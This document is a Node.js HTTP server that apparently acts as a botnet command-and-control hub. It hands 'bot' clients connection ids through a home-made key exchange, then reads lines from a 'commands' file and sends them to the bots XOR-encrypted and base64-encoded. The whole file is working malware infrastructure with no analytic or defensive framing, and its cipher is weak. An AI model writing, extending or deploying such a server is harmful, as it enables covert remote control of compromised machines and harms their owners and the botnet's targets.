var http = require('http');
var url  = require('url');
var fs = require('fs'); /* to read files */

var FILE = 'commands';
var PORT = 5000;

var ALPHA = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
var ALPHA_SIZE = ALPHA.length;

// connections[k] = object Connection wich id is equals to k
var connections = {};

/* ---------
	Define a class called "Connection".
	XXX: move this definition to another file.
 --------------- */
Connection = function(bot_client_partial_key) {

	var fun_connect = function connect(k_c){
		var date = new Date();
		var day = date.getDate();
		var base = (day + 1) * (day + 2) * (day + 3) * (day + 13);
		var N = 2147483647; // INT_MAX
		var r = N/2 + Math.floor(Math.random() * (N/2)) // INT_MAX/2 <= r <= INT_MAX
		var k_s = base ^ r;
		var key = k_c ^ r;

		return {'key':key, 'key_server':k_s};
	}
	/* Receive a key of length n and returns a string key of length 2n */
	var expand_key = function (key){
		var tmp = encode(key);
		tmp = encode(tmp);
		tmp = encode(tmp);
		tmp = encode(tmp);
		return encode(tmp);
	}

	var tmp = fun_connect(bot_client_partial_key);
	this.private_key = tmp.key;
	this.bot_master_partial_key = tmp.key_server;
	this.count = 1;
	this.id = generateConnectionId();
	this.date_last_connection = new Date();
	this.expanded_private_key = expand_key(expand_key(this.private_key));

	this.refresh = function (){
		this.count = (this.count + 1) % 256;
		this.date_last_connection = new Date();
	}

	this.encrypt = function(m){
		var j = 0;
		var c = '';
		var iv = this.count;
		var k = this.expanded_private_key;
		m = m + ''; // convert to string
		for (var i = 0; i < m.length; i++){
			c = c + String.fromCharCode(iv ^ m.charCodeAt(i) ^ k.charCodeAt(j));
			j = (j + 1) % k.length;
			if (j == 0)
				iv = (iv + 1) % 256;
		}
		return c;
	}


	this.decrypt = function(c){
		var j = 0;
		var m = '';
		var iv = this.count;
		var k = this.expanded_private_key;
		c = c + ''; // convert to string
		for (var i = 0; i < c.length; i++){
			m = m + String.fromCharCode(iv ^ c.charCodeAt(i) ^ k.charCodeAt(j));
			j = (j + 1) % k.length;
			if (j == 0)
				iv = (iv + 1) % 256;
		}
		return m;
	}

}

function encode(str){
	return new Buffer(str+'').toString('base64');
}

function decode(str64){
	return new Buffer(str64, 'base64').toString('ascii');
}

function generateConnectionId(){
	var INT_MAX = 2147483647;
	var r = Math.floor(Math.random() * 9) // 0 <= r <= 9
	var id_size = 15;
	var id = ''+r;
	for (var i = 1; i < id_size; i++){
		r = Math.floor(Math.random() * (ALPHA_SIZE))
		if (r % 3 == 0){
			id = ALPHA[ (r * i) % ALPHA_SIZE ] + id;
		}else if (r % 3 == 1){
			id = ALPHA[ (r + i) % ALPHA_SIZE ] + id;
		}else{
			id = id + ALPHA[ (r*r + i) % ALPHA_SIZE ];
		}
	}
	return id;
}

function first_connection (bot_client_partial_key, confirm_value, response){
	var resp = '';
	connection = new Connection (bot_client_partial_key);
	resp = encode(connection.id) + "\n";
	resp += encode(connection.bot_master_partial_key) + "\n";
	var confirmation = confirm_value ^ connection.private_key;

	resp += encode(connection.encrypt(confirm_value));

	response.write(resp);

	connections[connection.id] = connection; // save this connection into the hash of connections
}

function find_connection (id){
	if (connections[id] === undefined)
		return null;
	connections[id].refresh();
	return connections[id];
}

var server = http.createServer(function (request, response){
	response.writeHead(200, {"Content-Type": "text/html"});

	var result = url.parse(request.url, true);
	var params = result.query;
	
	console.log("params: ", params)

	// if an id was not sent, then, try to connect and get an id
	if (params['id'] == undefined){
		if (params['k_c'] !== undefined && params['confirm'] !== undefined){
			// XXX: check if k_c is a number
			first_connection(params['k_c'], params['confirm'], response);
			response.end();
		}else{
			response.write("<h2> BAD params ): </h2>");
			response.write("<h4> Try send<br/>id<br/>or<br/>k_c and confirm </h4>");
			response.end();
		}
	}else{
		connection = find_connection(params['id']);
		if (connection == null){
			response.write(encode("conn_not_found:" + params['id']));
			response.end();
		}else{
			response.write(encode(connection.encrypt("id:" + connection.id)) + "\n");
			// Read the file with the commands and send these commands to the client.
			var lineReader = require('line-reader');
			lineReader.open(FILE, function(reader) {
				if (reader.hasNextLine()) {
			    	reader.nextLine(function(line) {
						response.write(encode(connection.encrypt(line)) + "\n");
					});
				}else{
					response.end();
				}
			});
			/*
			fs.readFile(FILE, 'utf8', function (err,data) {
				if (err) {
    				return console.log(err);
				}
				response.write(encode(connection.encrypt(data)));
			});
			*/
		}
	}
});

server.listen(PORT);
